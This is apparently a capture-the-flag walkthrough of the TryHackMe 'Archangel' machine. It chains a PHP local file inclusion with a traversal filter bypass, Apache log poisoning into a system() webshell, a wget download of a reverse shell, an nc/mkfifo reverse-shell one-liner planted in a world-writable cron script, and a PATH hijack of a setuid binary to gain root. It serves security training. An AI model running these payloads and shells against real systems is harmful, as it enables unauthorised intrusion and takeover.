## Enumeration


Starting off with an nmap scan shows SSH and HTTP open

`root@kali:~/ctfs/thm/archangle# nmap -sC -sV 10.10.43.206

Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-04 14:01 EST
Nmap scan report for mafialive.thm (10.10.169.125)
Host is up (0.22s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/test.php
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel` 

Navigating to the website, I see a normal looking website, however I see another hostname of `mafialive.thm` under `Send us Mail`


![website](https://spy0x7.cf/assets/archangel/website.png)

I add this hostname to my `/etc/hosts` file and navigate to the new website and the first flag.


![flag1](https://spy0x7.cf/assets/archangel/flag1.png)

found `test.php` on  robots.txt on `mafialive.thm` 


Navigating to `test.php` I find a button


![test](https://spy0x7.cf/assets/archangel/test.png)

Pressing the button I find the URL changes to `test.php?view=/var/www/html/development_testing/mrrobot.php`


![test1](https://spy0x7.cf/assets/archangel/test1.png)


## Exploit


### LFI PHP Wrappers

The URL shown can be vulnerable to several things, such as SQL injection, directory traversal, RFI and LFI. Testing one by one I find most of them end with a `Not Allowed` response.

(https://spy0x7.cf/assets/archangel/notallowed.png)


Testing [PHP Wrappers](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601) for LFI, I find that it is possible to convert the page to base64

`http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php`

(https://spy0x7.cf/assets/archangel/base64.png)


Trying to read /etc/passwd still fails, so I try to read the test.php file instead to see what filtering is happening

`http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`

(https://spy0x7.cf/assets/archangel/base.png)


This gives a long base64 value. I save it to my machine then decrypt it


root@kali:~/ctfs/thm/archangle# cat base | base64 -d

<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

            //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            if(isset($_GET["view"])){
            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                include $_GET['view'];
            }else{

                echo 'Sorry, Thats not allowed';
            }
        }
        ?>
    </div>
</body>

</html>



### Log Poisoning

Looking at the base64 value decoded, I find that we are not allowed to use `../..` and we have to start our string with `/var/www/html/development_testing`. These are the only two conditions. A well known bypass for `../..` is to use a [double backslash](https://book.hacktricks.xyz/pentesting-web/file-inclusion#basic-lfi-and-bypasses) which we are allowed to do.

I test the double backslash to see if I can read /etc/passwd.


`http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//etc/passwd`


(https://spy0x7.cf/assets/archangel/passwd.png)

I can now use this to search the box. Looking for SSH keys do not work and I can’t read any useful files, so I try log poisoning. First, I need to find where the logs are stored. Testing the default places, I find `/var/log/apache2/access.log` contains all logs for the HTTP server.


`view-source:http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log`


(https://spy0x7.cf/assets/archangel/log.png)


Scrolling to the bottom of this log file, I see all of my requests through the LFI vulnerable.


`http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php?%3C?php%20system($_GET[%27c%27]);%20?%3E`

Refreshing access.log, I see my php code is now in the log file

(https://spy0x7.cf/assets/archangel/php.png)


I can now test command execution

`view-source:http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&c=whoami`


(https://spy0x7.cf/assets/archangel/www.png)


Since I can execute commands, I can upload files. Using a [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) I can upload this file and then navigate to it. I setup up a python HTTP Server on my local machine then use wget to upload the file


`view-source:http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&c=wget 10.2.8.75/php-reverse-shell.php`


It was uploaded correctly, now I need to see where it is exactly. Running a pwd command, I see it is under the home folder of `mafialive.thm`


`view-source:http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&c=pwd`

(https://spy0x7.cf/assets/archangel/pwd.png)


With the file now uploaded, I can set up a netcat listener and navigate to `http://mafialive.thm/php-reverse-shell.php` to gain a reverse shell


`root@kali:~/ctfs/thm/archangle# nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.2.8.75] from (UNKNOWN) [10.10.166.10] 40070
Linux ubuntu 4.15.0-123-generic #126-Ubuntu SMP Wed Oct 21 09:40:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:39:08 up 27 min,  0 users,  load average: 0.00, 0.00, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$`

I first import python3 into the shell


`$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/$ ^Z
[1]+  Stopped                 nc -lvnp 1234
root@kali:~/tryhackme/archangle# stty raw -echo
root@kali:~/tryhackme/archangle# fg

www-data@ubuntu:/$`


I can now read the second flag

(https://spy0x7.cf/assets/archangel/flag2.png)


Exploiting archangel User

To start, I uploaded and ran linpeas.sh


`www-data@ubuntu:/tmp$ wget 10.2.8.75/linpeas.sh

--2021-02-05 01:43:42--  http://10.2.8.75/linpeas.sh
Connecting to 10.2.8.75:80... connected.
HTTP request sent, awaiting response... 200 OK                                                                                                                                              
Length: 229696 (224K) [text/x-sh]                                                             
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 224.31K  61.4KB/s    in 3.7s

2021-02-05 01:43:47 (61.4 KB/s) - 'linpeas.sh' saved [229696/229696]
                                               
www-data@ubuntu:/tmp$ bash linpeas.sh`


Looking through the results, I find a cronjob for the archangel user


`[+] Cron jobs 

.............................................

*/1 *   * * *   archangel /opt/helloworld.sh`


Checking out this file, I see it runs a basic echo script.


`www-data@ubuntu:/opt$ cat helloworld.sh 
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt`


Looking at the permissions, I find everyone has permission to write to this file


`www-data@ubuntu:/opt$ ls -la helloworld.sh 
-rwxrwxrwx 1 archangel archangel 66 Nov 20 10:35 helloworld.sh`


Since I can write to the file, I put in a reverse shell


`www-data@ubuntu:/opt$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.8.75 1234 >/tmp/f" > helloworld.sh`


After setting up a netcat listener and waiting for a few moments, I get a connect back as archangel

`root@kali:~/tryhackme/archangle# nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.2.8.75] from (UNKNOWN) [10.10.166.10] 40080
/bin/sh: 0: can't access tty; job control turned off

$ whoami
archangel`


Again, I import python3 into the shell

`$ python3 -c 'import pty;pty.spawn("/bin/bash")'
archangel@ubuntu:~$ ^Z
[1]+  Stopped                 nc -lvnp 1234
root@kali:~/tryhackme/archangle# stty raw -echo
root@kali:~/tryhackme/archangle# fg

archangel@ubuntu:~$`


Now, I can read the 3rd flag


(https://spy0x7.cf/assets/archangel/flag3.jpg)


## Privilege Escalation to root


Under the secrets folder, I find a file named backup. Looking into this file, I find it is an ELF executable owned by root but can be executed by anyone


`archangel@ubuntu:~/secret$ file backup 
backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9093af828f30f957efce9020adc16dc214371d45, for GNU/Linux 3.2.0, not stripped

archangel@ubuntu:~/secret$ ls -la backup 
-rwsr-xr-x 1 root root 16904 Nov 18 16:40 backup`


I would like to know what this executable does, so I run strings against it. Here I find that it copies all files in the myfiles folder using cp.


`archangel@ubuntu:~/secret$ strings backup 
/lib64/ld-linux-x86-64.so.2
setuid        
system      
__cxa_finalize                           
setgid                                                                                        
__libc_start_main          
libc.so.6
GLIBC_2.2.5        
_ITM_deregisterTMCloneTable
__gmon_start__           
_ITM_registerTMCloneTable
u+UH                       
[]A\A]A^A_
cp /home/user/archangel/myfiles/* /opt/backupfiles`



This does not use the full path for cp, which means it is vulnerable to a [Path Variable Privilege Escaltion](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/). By default on linux, most variables are under sbin or bin. However we can create our own path and variable for cp so when we execute this file, it will execute the CP located in our path.

To start, we must craft a file named cp. I did this under the `/tmp` directory

`archangel@ubuntu:/tmp$ echo "/bin/bash" > cp
archangel@ubuntu:/tmp$ chmod 777 cp`


Now, I need to change my PATH variable to /tmp


`archangel@ubuntu:/tmp$ export PATH=/tmp:$PATH`


With my path changed, when I execute backup, it will look for the cp file under the tmp directory and execute it. Since root owns the file, root will excute it

`archangel@ubuntu:/tmp$ ~/secret/backup 
root@ubuntu:/tmp#`

As root, I can now read the final flag

(https://spy0x7.cf/assets/archangel/root.png)


Exit.py